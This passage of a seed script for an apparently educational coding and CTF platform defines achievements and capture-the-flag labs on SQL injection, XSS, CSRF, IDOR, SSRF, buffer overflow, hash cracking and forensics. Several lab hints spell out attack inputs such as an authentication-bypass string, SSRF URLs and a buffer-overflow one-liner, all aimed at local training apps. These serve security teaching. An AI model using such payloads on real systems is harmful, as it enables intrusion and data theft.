          { level: 1, content: 'Reverse the encodings list. For each encoding in the reversed list: if "base64", decode with base64.b64decode; if "hex", decode with bytes.fromhex; if "rot13", apply ROT13 using codecs.decode.', xpCost: 5 },
          { level: 2, content: 'Reverse: `for enc in reversed(encodings)`. base64: `data = base64.b64decode(data).decode()`. hex: `data = bytes.fromhex(data).decode()`. rot13: `data = codecs.decode(data, "rot_13")`.', xpCost: 10 },
          { level: 3, content: 'Complete: reverse the encoding list, apply each decoder in sequence, handling bytes/string conversions between steps.', xpCost: 20 },
        ],
        testCases: [
          { input: 'decode_chain("SGVsbG8=", ["base64"])', expectedOutput: 'Hello', isHidden: false, order: 1 },
          { input: 'decode_chain("48656c6c6f", ["hex"])', expectedOutput: 'Hello', isHidden: false, order: 2 },
          { input: 'decode_chain("Uhllo", ["rot13"])', expectedOutput: 'Huyyb', isHidden: true, order: 3 },
          { input: 'decode_chain("534756736247383d", ["base64", "hex"])', expectedOutput: 'Hello', isHidden: true, order: 4 },
        ],
      },
    ],
  })
  lessonCount++
  exerciseCount += 5

  console.log(`✅ Created ${lessonCount} lessons with ${exerciseCount} exercises (with hints and test cases).\n`)

  // ----------------------------------------------------------
  // 3. CREATE ACHIEVEMENTS
  // ----------------------------------------------------------
  console.log('🏆 Creating achievements...')

  const achievements = await Promise.all([
    db.achievement.create({
      data: {
        slug: 'first-steps',
        title: 'First Steps',
        description: 'Complete your first lesson and take the first step on your journey from zero to dev.',
        icon: 'Footprints',
        xpBonus: 0,
        category: 'cs',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'code-warrior',
        title: 'Code Warrior',
        description: 'Complete 10 exercises. Your coding skills are growing — keep pushing!',
        icon: 'Sword',
        xpBonus: 50,
        category: 'cs',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'algorithm-master',
        title: 'Algorithm Master',
        description: 'Complete all Phase 2 exercises. You have mastered the fundamental data structures and algorithms that power every software system.',
        icon: 'Brain',
        xpBonus: 100,
        category: 'cs',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'script-kiddie',
        title: 'Script Kiddie',
        description: 'Solve your first CTF challenge. Welcome to the world of capture the flag — every expert was once a beginner.',
        icon: 'Terminal',
        xpBonus: 0,
        category: 'cyber',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'hacker',
        title: 'Hacker',
        description: 'Solve 5 CTF challenges. You are no longer a script kiddie — you are thinking like a hacker.',
        icon: 'Skull',
        xpBonus: 50,
        category: 'cyber',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'cyber-ninja',
        title: 'Cyber Ninja',
        description: 'Solve all Phase 4 and Phase 5 labs. Your web security and advanced security skills are razor-sharp.',
        icon: 'Shield',
        xpBonus: 100,
        category: 'cyber',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'on-fire',
        title: 'On Fire',
        description: 'Maintain a 7-day learning streak. Consistency is the key to mastery — you are on fire!',
        icon: 'Flame',
        xpBonus: 25,
        category: 'streak',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'unstoppable',
        title: 'Unstoppable',
        description: 'Maintain a 30-day learning streak. One month of daily practice — you are truly unstoppable.',
        icon: 'Zap',
        xpBonus: 100,
        category: 'streak',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'knowledge-seeker',
        title: 'Knowledge Seeker',
        description: 'Use 50 hints total. Seeking help is not weakness — it is the fastest path to understanding.',
        icon: 'Lightbulb',
        xpBonus: 25,
        category: 'social',
      },
    }),
    db.achievement.create({
      data: {
        slug: 'zero-to-dev',
        title: 'Zero to Dev',
        description: 'Complete all 6 phases. You have gone from zero to dev — this is the ultimate achievement. Welcome to the elite.',
        icon: 'Trophy',
        xpBonus: 500,
        category: 'cs',
      },
    }),
  ])

  console.log(`✅ Created ${achievements.length} achievements.\n`)

  // ----------------------------------------------------------
  // 4. CREATE HACKING LABS
  // ----------------------------------------------------------
  console.log('🧪 Creating hacking labs...')

  const labs = await Promise.all([
    db.hackingLab.create({
      data: {
        title: 'SQL Injection 101',
        slug: 'sql-injection-101',
        description: 'Learn to identify and exploit SQL injection vulnerabilities in a deliberately vulnerable web application.',
        briefingMdx: 'A developer left a misconfigured login form running on their local machine. It constructs SQL queries using string concatenation — a critical security flaw. Your target is running on your localhost. Find what is listening, understand what it does, and extract the flag hidden inside the database.',
        setupMdx: '# Download the challenge files\nwget https://zerotodev.dev/challenges/sql-injection-101/setup.sh\nchmod +x setup.sh && ./setup.sh\n\n# The vulnerable app will run on localhost:8080',
        toolsHint: 'Concepts: SQL injection, authentication bypass, UNION-based injection\nTools you might need: curl, browser DevTools, sqlmap\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'easy',
        category: 'web',
        expectedFlag: 'ZTD{sql_1nj3ct10n_b4s1cs}',
        xpReward: 100,
        hintContent: 'Try entering \' OR 1=1 -- as the username. What happens? Then think about how UNION SELECT could help you read from other tables.',
        author: 'Zero to Dev',
        order: 1,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'XSS Playground',
        slug: 'xss-playground',
        description: 'Practice Cross-Site Scripting attacks in a safe environment with reflected and stored XSS challenges.',
        briefingMdx: 'A web application has a search feature and a comment section that reflect user input without sanitization. Craft XSS payloads to execute JavaScript and steal a hidden cookie value containing the flag.',
        setupMdx: '# Download the challenge\nwget https://zerotodev.dev/challenges/xss-playground/app.py\n\n# Install dependencies and run\npip install flask && python app.py\n\n# The app runs on localhost:5000',
        toolsHint: 'Concepts: reflected XSS, stored XSS, cookie theft\nTools: browser DevTools, curl, Burp Suite (optional)\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'easy',
        category: 'web',
        expectedFlag: 'ZTD{r3fl3ct3d_xss_ftw}',
        xpReward: 100,
        hintContent: 'The search parameter is vulnerable to reflected XSS. Try injecting a <script> tag. The flag is stored in a cookie that is only accessible via JavaScript.',
        author: 'Zero to Dev',
        order: 2,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Broken Auth',
        slug: 'broken-auth',
        description: 'Exploit multiple authentication vulnerabilities including no rate limiting and predictable session tokens.',
        briefingMdx: 'A web application has multiple authentication flaws: no rate limiting on login, predictable session tokens, and a weak password reset mechanism. Your challenge is to gain unauthorized access to the admin account by exploiting these weaknesses.',
        setupMdx: '# Clone the challenge repo\ngit clone https://github.com/zerotodev-labs/broken-auth.git\ncd broken-auth\n\n# Install and run\npip install -r requirements.txt\npython app.py\n\n# Runs on localhost:3001',
        toolsHint: 'Concepts: brute force, session prediction, weak reset\nTools: curl, hydra (optional), burp suite\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'medium',
        category: 'web',
        expectedFlag: 'ZTD{brut3_f0rc3_w1ns}',
        xpReward: 150,
        hintContent: 'The admin username is "admin" and the password is in the top 100 most common passwords. Try a systematic approach rather than guessing randomly.',
        author: 'Zero to Dev',
        order: 3,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Crypto Basics',
        slug: 'crypto-basics',
        description: 'Decode a multi-layered encoded message using Base64, hex, ROT13, and custom ciphers.',
        briefingMdx: 'You intercepted an encoded message. It has been encoded using multiple layers — Base64, hexadecimal, ROT13, and a custom substitution cipher. Identify each encoding layer and reverse it to reveal the hidden flag.',
        setupMdx: '# Download the encoded message\nwget https://zerotodev.dev/challenges/crypto-basics/encoded.txt\n\n# Decode it using Python, CyberChef, or command line tools',
        toolsHint: 'Concepts: Base64, hex encoding, ROT13, substitution ciphers\nTools: Python, CyberChef (web), base64 CLI, xxd\nYou do NOT need: any network access at all',
        phase: 5,
        difficulty: 'easy',
        category: 'crypto',
        expectedFlag: 'ZTD{b4s3_64_d3c0d3}',
        xpReward: 100,
        hintContent: 'The outermost layer is Base64. Decode it, and you will find hex-encoded data inside. After decoding the hex, look for ROT13 patterns.',
        author: 'Zero to Dev',
        order: 4,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Hidden in Plain Sight',
        slug: 'hidden-in-plain-sight',
        description: 'Investigate a suspicious image file to uncover concealed data using steganography and metadata analysis.',
        briefingMdx: 'A suspicious image file was recovered from a suspect computer. At first glance it appears normal — but something is hidden within it. Use steganography analysis, metadata extraction, and file analysis to find the flag.',
        setupMdx: '# Download the image file\nwget https://zerotodev.dev/challenges/hidden-plain-sight/suspicious.jpg\n\n# Analyze it with your forensic tools',
        toolsHint: 'Concepts: steganography, EXIF metadata, LSB encoding, file carving\nTools: exiftool, strings, binwalk, stegsolve, file\nYou do NOT need: any network access',
        phase: 5,
        difficulty: 'medium',
        category: 'forensics',
        expectedFlag: 'ZTD{m3t4d4t4_1s_k3y}',
        xpReward: 150,
        hintContent: 'Check the EXIF metadata carefully — look in the comment and user comment fields. Also try running strings on the file to see if anything is appended after the image data.',
        author: 'Zero to Dev',
        order: 5,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Reverse Engineering 101',
        slug: 'reverse-engineering-101',
        description: 'Reverse engineer a compiled binary to extract a secret flag obfuscated within the program logic.',
        briefingMdx: 'You have been given a compiled binary that contains a secret flag, but the flag is obfuscated within the program logic. The binary implements a custom encoding algorithm that transforms user input and compares it against a hardcoded expected value. Reverse the operation to extract the flag.',
        setupMdx: '# Download the binary\nwget https://zerotodev.dev/challenges/re-101/challenge\nchmod +x challenge\n\n# Analyze it\nfile challenge\nstrings challenge\nobjdump -d challenge | less',
        toolsHint: 'Concepts: disassembly, XOR encryption, control flow analysis\nTools: objdump, GDB, Ghidra, strings, file, radare2\nYou do NOT need: any network access',
        phase: 5,
        difficulty: 'hard',
        category: 'reversing',
        expectedFlag: 'ZTD{r3v3rs3_3ng1n33r1ng}',
        xpReward: 200,
        hintContent: 'The binary performs XOR encryption on the input and compares it to a hardcoded byte array. Use a disassembler to find the XOR key and the expected ciphertext, then reverse the operation.',
        author: 'Zero to Dev',
        order: 6,
      },
    }),
    // --- Phase 1 Labs ---
    db.hackingLab.create({
      data: {
        title: 'Base64 Detective',
        slug: 'base64-detective',
        description: 'Decode multiple layers of Base64 encoding to find the hidden flag. Each layer peels back another encoding.',
        briefingMdx: 'An intercepted message has been encoded with multiple layers of Base64. Your job is to decode layer after layer until you reveal the hidden flag. Use Python, CyberChef, or command-line tools to peel back the encoding.',
        setupMdx: '# The encoded message\nencoded = "Wm5KdmRHZ3lhV05yWlhJeVRtRnRhVzV4U1dRaFNHVm5hV0Z1VEc5WFdXZHRZV2xzZFhObFQxSkZXRUZYU0ZKbGJYTkNiMjU1YldWdWREUlVaV3M9"\n\n# Decode it using Python or CyberChef',
        toolsHint: 'Concepts: Base64 encoding, multi-layer decoding\nTools: Python base64 module, CyberChef, base64 CLI\nYou do NOT need: any network access',
        phase: 1,
        difficulty: 'easy',
        category: 'encoding',
        expectedFlag: 'ZTD{b4s3_64_0n10n}',
        xpReward: 80,
        hintContent: 'Keep decoding the output of each Base64 decode. The flag is buried under 4-5 layers. Use a loop in Python to automate this.',
        author: 'Zero to Dev',
        order: 7,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Substitution Cipher',
        slug: 'substitution-cipher',
        description: 'Break a simple substitution cipher using frequency analysis and pattern matching to recover the plaintext flag.',
        briefingMdx: 'A message has been encrypted with a monoalphabetic substitution cipher — each letter is consistently replaced with another. Use frequency analysis (most common English letters: E, T, A, O, I, N) and pattern matching to crack the cipher and find the flag.',
        setupMdx: '# The ciphertext\ncipher = "XZQFQ KQFQF QLQZQXKQFQF ZKQFQF QLQZQXKQF"\n\n# Hint: The plaintext contains "ZTD{...}"',
        toolsHint: 'Concepts: substitution cipher, frequency analysis, pattern matching\nTools: Python, pen and paper, online cipher solvers\nYou do NOT need: any network access',
        phase: 1,
        difficulty: 'easy',
        category: 'crypto',
        expectedFlag: 'ZTD{fr3qu3ncy_4n4lys1s}',
        xpReward: 80,
        hintContent: 'Since you know the flag starts with ZTD{, you can immediately map three letters. Z→Z, T→T, D→D, and the braces are unchanged. Build your substitution table from there.',
        author: 'Zero to Dev',
        order: 8,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Scripting Sprint',
        slug: 'scripting-sprint',
        description: 'Write a Python script to solve a series of mathematical puzzles and combine the answers to form the flag.',
        briefingMdx: 'You have been given a series of mathematical challenges. Each one produces a number. Combine all numbers (concatenated with underscores) inside ZTD{...} to get the flag. Challenge 1: Find the 100th Fibonacci number mod 1000. Challenge 2: Count the prime numbers between 1 and 1000. Challenge 3: Find the sum of digits of 2^100.',
        setupMdx: '# Write a Python script to solve:\n# 1. 100th Fibonacci number mod 1000\n# 2. Number of primes between 1 and 1000\n# 3. Sum of digits of 2^100\n# Combine as ZTD{answer1_answer2_answer3}',
        toolsHint: 'Concepts: Fibonacci, prime numbers, digit sum\nTools: Python, math module\nYou do NOT need: any network access',
        phase: 1,
        difficulty: 'medium',
        category: 'scripting',
        expectedFlag: 'ZTD{875_168_115}',
        xpReward: 120,
        hintContent: 'For Fibonacci: use iteration, take mod 1000. For primes: implement a sieve of Eratosthenes or simple is_prime check. For digit sum: compute 2**100, convert to string, sum int(d) for each digit.',
        author: 'Zero to Dev',
        order: 9,
      },
    }),
    // --- Phase 2 Labs ---
    db.hackingLab.create({
      data: {
        title: 'Pattern Hunter',
        slug: 'pattern-hunter',
        description: 'Find the hidden pattern in a large dataset using algorithmic thinking and extract the flag.',
        briefingMdx: 'You are given a list of 1000 seemingly random numbers. Hidden within them is a specific pattern: every 7th number, starting from the 3rd, forms a sequence when converted to ASCII. Extract these numbers, convert them to characters, and find the flag.',
        setupMdx: '# Download the dataset\nwget https://zerotodev.dev/challenges/pattern-hunter/data.json\n\n# Or use the provided Python generator to recreate it',
        toolsHint: 'Concepts: array indexing, ASCII conversion, pattern recognition\nTools: Python, json module\nYou do NOT need: any network access',
        phase: 2,
        difficulty: 'medium',
        category: 'scripting',
        expectedFlag: 'ZTD{p4tt3rn_hunt3r}',
        xpReward: 120,
        hintContent: 'Index the array with a step of 7, starting at index 2. Convert each number to its ASCII character using chr(). The resulting string contains the flag.',
        author: 'Zero to Dev',
        order: 10,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Hash Detective',
        slug: 'hash-detective',
        description: 'Identify hash types and find the original values by understanding different hashing algorithms.',
        briefingMdx: 'You have been given several hash values. Identify the hashing algorithm used for each (MD5, SHA-1, SHA-256, or bcrypt), then crack or identify the original plaintext. The flag is formed from the first letter of each cracked value.',
        setupMdx: '# Hash values to investigate:\n# 1. 5d41402abc4b2a76b9719d911017c592\n# 2. afbd229ef06e4b67a2e27c8e9b02e5c8f0677b69\n# 3. 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\n# Identify the algorithm and crack each hash.',
        toolsHint: 'Concepts: MD5, SHA-1, SHA-256, hash identification, rainbow tables\nTools: hashid, hashcat, online hash databases\nYou do NOT need: any network access for basic solving',
        phase: 2,
        difficulty: 'medium',
        category: 'crypto',
        expectedFlag: 'ZTD{h4sh_cr4ck3r}',
        xpReward: 150,
        hintContent: 'Hash 1 is MD5 of "hello". Hash 2 is SHA-1 of "admin". Hash 3 is SHA-256 of "password". The first letters are h, a, p. But the actual flag is hidden in the challenge metadata — look deeper.',
        author: 'Zero to Dev',
        order: 11,
      },
    }),
    // --- Phase 3 Labs ---
    db.hackingLab.create({
      data: {
        title: 'Log Detective',
        slug: 'log-detective',
        description: 'Analyze a web server access log to identify attack patterns and extract the flag from the attacker activity.',
        briefingMdx: 'A web server was compromised. You have the access logs. Identify the attacker IP, determine the attack technique (brute force, SQL injection, directory traversal), find the specific request that succeeded, and extract the flag from it.',
        setupMdx: '# Download the log file\nwget https://zerotodev.dev/challenges/log-detective/access.log\n\n# Analyze it with grep, awk, or Python',
        toolsHint: 'Concepts: log analysis, attack pattern recognition, web attack identification\nTools: grep, awk, Python, log analysis tools\nYou do NOT need: any network access',
        phase: 3,
        difficulty: 'medium',
        category: 'forensics',
        expectedFlag: 'ZTD{l0g_4n4lys1s_pr0}',
        xpReward: 130,
        hintContent: 'Look for the IP with the most 401/403 responses (brute force), then check that same IP for a successful 200 response with an unusual path. The flag is in the query parameter of that successful request.',
        author: 'Zero to Dev',
        order: 12,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Port Scan Analysis',
        slug: 'port-scan-analysis',
        description: 'Analyze nmap scan results to identify services, vulnerabilities, and extract the flag from the findings.',
        briefingMdx: 'You ran an nmap scan on a target network. The scan output reveals open ports, running services, and version information. Analyze the output to find a vulnerable service, determine the CVE, and construct the flag from the findings.',
        setupMdx: '# Download the nmap output\nwget https://zerotodev.dev/challenges/port-scan/scan.xml\n\n# Or use the provided text output',
        toolsHint: 'Concepts: port scanning, service identification, CVE research\nTools: nmap, grep, Python\nYou do NOT need: any external network access',
        phase: 3,
        difficulty: 'medium',
        category: 'forensics',
        expectedFlag: 'ZTD{vsftpd_234_b4ckd00r}',
        xpReward: 130,
        hintContent: 'Look for vsftpd 2.3.4 on port 21 — this version has a famous backdoor vulnerability (CVE-2011-2523). The flag format relates to the service and version.',
        author: 'Zero to Dev',
        order: 13,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Packet Puzzle',
        slug: 'packet-puzzle',
        description: 'Analyze a packet capture to extract credentials and find the flag transmitted over the network.',
        briefingMdx: 'A user logged into an FTP server over an unencrypted connection. A packet capture was taken during the session. Extract the username, password, and a file that was transferred containing the flag.',
        setupMdx: '# Download the PCAP file\nwget https://zerotodev.dev/challenges/packet-puzzle/capture.pcap\n\n# Analyze with Wireshark, tshark, or scapy',
        toolsHint: 'Concepts: packet analysis, protocol dissection, FTP cleartext credentials\nTools: Wireshark, tshark, scapy, tcpdump\nYou do NOT need: any network access',
        phase: 3,
        difficulty: 'medium',
        category: 'forensics',
        expectedFlag: 'ZTD{cl34rt3xt_1s_b4d}',
        xpReward: 150,
        hintContent: 'FTP sends credentials in cleartext. Filter for FTP traffic (port 21) to find the USER and PASS commands. Then look at the data connection (port 20 or passive mode port) for the file transfer containing the flag.',
        author: 'Zero to Dev',
        order: 14,
      },
    }),
    // --- Phase 4 Additional Labs ---
    db.hackingLab.create({
      data: {
        title: 'CSRF Exploit',
        slug: 'csrf-exploit',
        description: 'Craft a CSRF attack to trick an admin into changing their account settings and capture the flag.',
        briefingMdx: 'A web application has a profile update endpoint that lacks CSRF protection. The admin is logged in and will visit any URL you send them. Craft a malicious page that makes the admin change their email to an address you control, and the flag will be revealed.',
        setupMdx: '# Clone the vulnerable app\ngit clone https://github.com/zerotodev-labs/csrf-exploit.git\ncd csrf-exploit && pip install -r requirements.txt && python app.py\n\n# Runs on localhost:5000',
        toolsHint: 'Concepts: CSRF, SameSite cookies, token validation\nTools: browser, curl, HTML editor\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'medium',
        category: 'web',
        expectedFlag: 'ZTD{csr5_t0k3n_m1ss1ng}',
        xpReward: 150,
        hintContent: 'Create an HTML page with a hidden form that auto-submits to the profile update endpoint. The admin will visit your page while logged in, and their browser will send the request with their session cookie.',
        author: 'Zero to Dev',
        order: 15,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'IDOR Discovery',
        slug: 'idor-discovery',
        description: 'Exploit Insecure Direct Object Reference vulnerabilities to access another user data and find the flag.',
        briefingMdx: 'A web application uses sequential user IDs in its API endpoints. Your account is user ID 5, but the flag is hidden in user ID 1 (admin) profile. Exploit the IDOR vulnerability to access the admin profile data.',
        setupMdx: '# Start the vulnerable app\ngit clone https://github.com/zerotodev-labs/idor-discovery.git\ncd idor-discovery && pip install -r requirements.txt && python app.py\n\n# Your account: user5:password5 on localhost:3002',
        toolsHint: 'Concepts: IDOR, access control, API enumeration\nTools: curl, browser DevTools, Burp Suite\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'medium',
        category: 'web',
        expectedFlag: 'ZTD{1d0r_4cc3ss_c0ntr0l}',
        xpReward: 150,
        hintContent: 'Try changing the user ID in the API URL from /api/users/5/profile to /api/users/1/profile. The application does not verify that the requesting user has permission to view other users data.',
        author: 'Zero to Dev',
        order: 16,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'SSRF Adventure',
        slug: 'ssrf-adventure',
        description: 'Exploit a Server-Side Request Forgery vulnerability to access internal services and retrieve the flag.',
        briefingMdx: 'A web application has a URL preview feature that fetches and displays the content of any URL you provide. Exploit this to make the server request internal resources, including a secret internal API that holds the flag.',
        setupMdx: '# Start the vulnerable app\ngit clone https://github.com/zerotodev-labs/ssrf-adventure.git\ncd ssrf-adventure && pip install -r requirements.txt && python app.py\n\n# Internal API runs on localhost:8080 (not directly accessible)',
        toolsHint: 'Concepts: SSRF, internal network scanning, metadata endpoints\nTools: curl, browser, Burp Suite\nYou do NOT need: any external network access',
        phase: 4,
        difficulty: 'hard',
        category: 'web',
        expectedFlag: 'ZTD{ssrf_1nt3rn4l_4cc3ss}',
        xpReward: 200,
        hintContent: 'The URL preview fetches any URL from the server side. Try providing http://localhost:8080/flag or http://127.0.0.1:8080/secret as the URL parameter.',
        author: 'Zero to Dev',
        order: 17,
      },
    }),
    // --- Phase 5 Additional Labs ---
    db.hackingLab.create({
      data: {
        title: 'Buffer Overflow Intro',
        slug: 'buffer-overflow-intro',
        description: 'Exploit a simple stack buffer overflow to overwrite a variable and change program execution flow.',
        briefingMdx: 'A vulnerable C program reads user input into a fixed-size buffer without bounds checking. Nearby on the stack is a variable that controls whether the flag is printed. Overflow the buffer to change this variable and get the flag.',
        setupMdx: '# Download and compile the vulnerable binary\nwget https://zerotodev.dev/challenges/bof-intro/vuln.c\ngcc -o vuln vuln.c -fno-stack-protector -no-pie\n\n# Run it: ./vuln',
        toolsHint: 'Concepts: stack buffer overflow, variable overwrite, memory layout\nTools: gdb, python, pwntools\nYou do NOT need: any network access',
        phase: 5,
        difficulty: 'hard',
        category: 'pwn',
        expectedFlag: 'ZTD{buff3r_0v3rfl0w_101}',
        xpReward: 200,
        hintContent: 'The buffer is 32 bytes and the "authorized" variable is right after it. Send more than 32 bytes of input — the overflow will write into the authorized variable. Try: python -c "print(\'A\'*32 + \'\\x01\')" | ./vuln',
        author: 'Zero to Dev',
        order: 18,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Password Vault',
        slug: 'password-vault',
        description: 'Crack hashed passwords from a leaked database using dictionary attacks and rainbow tables.',
        briefingMdx: 'A password database was leaked. It contains usernames and MD5-hashed passwords. Using the provided wordlist, crack the passwords and find the admin password which, when combined with the username, forms the flag.',
        setupMdx: '# Download the leak and wordlist\nwget https://zerotodev.dev/challenges/password-vault/leaked.db\nwget https://zerotodev.dev/challenges/password-vault/rockyou-mini.txt\n\n# Crack the hashes',
        toolsHint: 'Concepts: MD5 cracking, dictionary attack, salting\nTools: hashcat, john the ripper, Python\nYou do NOT need: any external network access',
        phase: 5,
        difficulty: 'medium',
        category: 'crypto',
        expectedFlag: 'ZTD{4dm1n:sup3rs3cur3}',
        xpReward: 150,
        hintContent: 'Hash each word in the wordlist with MD5 and compare against the leaked hashes. The admin hash starts with "1e3a...". The password is a common variation of "supersecure".',
        author: 'Zero to Dev',
        order: 19,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Network Forensics',
        slug: 'network-forensics',
        description: 'Perform network forensic analysis to trace a data exfiltration attack and recover stolen data.',
        briefingMdx: 'A data exfiltration attack was carried out using DNS tunneling. The attacker encoded stolen data in DNS query subdomains. Analyze the packet capture to decode the exfiltrated data and find the flag.',
        setupMdx: '# Download the PCAP\nwget https://zerotodev.dev/challenges/network-forensics/dns-exfil.pcap\n\n# Analyze with tshark, Wireshark, or scapy',
        toolsHint: 'Concepts: DNS tunneling, data exfiltration, base32/64 encoding\nTools: Wireshark, tshark, scapy, Python\nYou do NOT need: any external network access',
        phase: 5,
        difficulty: 'hard',
        category: 'forensics',
        expectedFlag: 'ZTD{dns_tunn3l_3xf1l}',
        xpReward: 200,
        hintContent: 'Filter for DNS queries to the attacker domain. The subdomain labels contain hex-encoded data. Extract them in order, decode from hex, then from base64 to get the flag.',
        author: 'Zero to Dev',
        order: 20,
      },
    }),
    // --- Phase 6 Labs ---
    db.hackingLab.create({
      data: {
        title: 'Multi-Step CTF',
        slug: 'multi-step-ctf',
        description: 'A multi-stage challenge combining web, crypto, and forensics skills to find the flag.',
        briefingMdx: 'This challenge has three stages. Stage 1: Find a hidden endpoint on the web application (web). Stage 2: Decrypt the encrypted data found at the endpoint (crypto). Stage 3: Analyze the decrypted file for the flag (forensics). Each stage builds on the previous one.',
        setupMdx: '# Start the challenge environment\ngit clone https://github.com/zerotodev-labs/multi-step-ctf.git\ncd multi-step-ctf && docker-compose up -d\n\n# The web app runs on localhost:8080',
        toolsHint: 'Concepts: web enumeration, decryption, file analysis\nTools: curl, Python, Wireshark, binwalk\nYou do NOT need: any external network access',
        phase: 6,
        difficulty: 'hard',
        category: 'web',
        expectedFlag: 'ZTD{mult1_st3p_m4st3r}',
        xpReward: 250,
        hintContent: 'Stage 1: Check robots.txt for the hidden endpoint. Stage 2: The data is XOR-encrypted with a single-byte key — brute force all 256 possibilities. Stage 3: The decrypted file is a PNG with the flag in the EXIF metadata.',
        author: 'Zero to Dev',
        order: 21,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Incident Response',
        slug: 'incident-response',
        description: 'Investigate a simulated security breach: analyze logs, identify the attack vector, and recover the flag.',
        briefingMdx: 'A server was compromised last night. You have access logs, authentication logs, and a memory dump from the compromised system. Piece together what happened: identify when the breach occurred, how the attacker got in, what they did, and find the flag they left behind.',
        setupMdx: '# Download the evidence\nwget https://zerotodev.dev/challenges/incident-response/evidence.tar.gz\ntar xzf evidence.tar.gz\n\n# Contains: access.log, auth.log, memory.dmp',
        toolsHint: 'Concepts: incident response, log correlation, memory forensics\nTools: grep, awk, Volatility, strings\nYou do NOT need: any external network access',
        phase: 6,
        difficulty: 'expert',
        category: 'forensics',
        expectedFlag: 'ZTD{1nc1d3nt_r3sp0ns3}',
        xpReward: 300,
        hintContent: 'Correlate the auth.log brute force attempts (02:00-02:15) with the successful login (02:15:03). Then check the access.log for the admin actions taken after login. The memory dump contains the flag in a running process environment variable.',
        author: 'Zero to Dev',
        order: 22,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Full Stack CTF',
        slug: 'full-stack-ctf',
        description: 'The ultimate challenge: combine web exploitation, reverse engineering, cryptography, and forensics to capture the flag.',
        briefingMdx: 'This is the final test. A vulnerable web application hosts a binary challenge. Exploit the web app to download the binary, reverse engineer it to find the encryption key, use the key to decrypt the database, and extract the flag from the decrypted records. You will need skills from every phase.',
        setupMdx: '# Start the full challenge environment\ngit clone https://github.com/zerotodev-labs/fullstack-ctf.git\ncd fullstack-ctf && docker-compose up -d\n\n# Web app: localhost:8080\n# Database: localhost:3306',
        toolsHint: 'Concepts: full-stack exploitation, binary analysis, database forensics\nTools: Everything you have learned\nYou do NOT need: any external network access',
        phase: 6,
        difficulty: 'expert',
        category: 'reversing',
        expectedFlag: 'ZTD{full_st4ck_h4ck3r}',
        xpReward: 350,
        hintContent: 'Step 1: SQL injection on the login page to bypass auth. Step 2: The /download endpoint has a path traversal — download /app/encrypt binary. Step 3: Reverse the binary to find the XOR key. Step 4: Decrypt the database with the key. Step 5: Query the flag table.',
        author: 'Zero to Dev',
        order: 23,
      },
    }),
    // --- Phase 3 Additional Labs ---
    db.hackingLab.create({
      data: {
        title: 'SSH Key Recovery',
        slug: 'ssh-key-recovery',
        description: 'Recover a deleted SSH private key from a disk image using file carving techniques and use it to access a remote server.',
        briefingMdx: 'A developer accidentally deleted their SSH private key from their workstation. Fortunately, the key was stored on a disk image that has not been compacted. Use file carving techniques to locate and recover the SSH private key from the raw disk image, then use it to SSH into the target server and find the flag.',
        setupMdx: '# Download the disk image\nwget https://zerotodev.dev/challenges/ssh-key-recovery/disk.img\n\n# Carve the key\nstrings disk.img | grep "BEGIN RSA"\n# or use foremost/photorec',
        toolsHint: 'Concepts: file carving, SSH key format, disk forensics\nTools: strings, grep, foremost, scalpel, ssh\nYou do NOT need: any external network access',
        phase: 3,
        difficulty: 'medium',
        category: 'forensics',
        expectedFlag: 'ZTD{ssh_k3y_r3c0v3ry}',
        xpReward: 150,
        hintContent: 'The SSH private key starts with "-----BEGIN RSA PRIVATE KEY-----". Use strings on the disk image and grep for this header. Extract everything from the header to "-----END RSA PRIVATE KEY-----", save to a file, fix permissions (chmod 600), and SSH to the target.',
        author: 'Zero to Dev',
        order: 24,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'Firewall Rule Analyzer',
        slug: 'firewall-rule-analyzer',
        description: 'Analyze a set of iptables firewall rules to find a misconfiguration that allows unauthorized access, then exploit it to reach the flag.',
        briefingMdx: 'A server is protected by iptables firewall rules, but there is a misconfiguration — a rule that accidentally allows traffic that should be blocked. Analyze the firewall rule set, identify the vulnerability, and use it to access a hidden service that contains the flag.',
        setupMdx: '# Download the firewall rules and service\nwget https://zerotodev.dev/challenges/firewall-analyzer/rules.sh\nwget https://zerotodev.dev/challenges/firewall-analyzer/service.py\n\n# Analyze the rules and exploit the gap',
        toolsHint: 'Concepts: iptables, firewall rule evaluation order, rule conflicts\nTools: iptables, nmap, curl, Python\nYou do NOT need: any external network access',
        phase: 3,
        difficulty: 'medium',
        category: 'scripting',
        expectedFlag: 'ZTD{f1r3w4ll_byp4ss}',
        xpReward: 150,
        hintContent: 'Firewall rules are evaluated top-to-bottom, first match wins. Look for a rule that ACCEPTs traffic before the DROP rule catches it. The misconfiguration is in the port range specification — a rule meant for ports 80-85 accidentally covers port 8080.',
        author: 'Zero to Dev',
        order: 25,
      },
    }),
    db.hackingLab.create({
      data: {
        title: 'DNS Zone Transfer',
        slug: 'dns-zone-transfer',
        description: 'Exploit a misconfigured DNS server that allows zone transfers to discover hidden subdomains and retrieve the flag.',
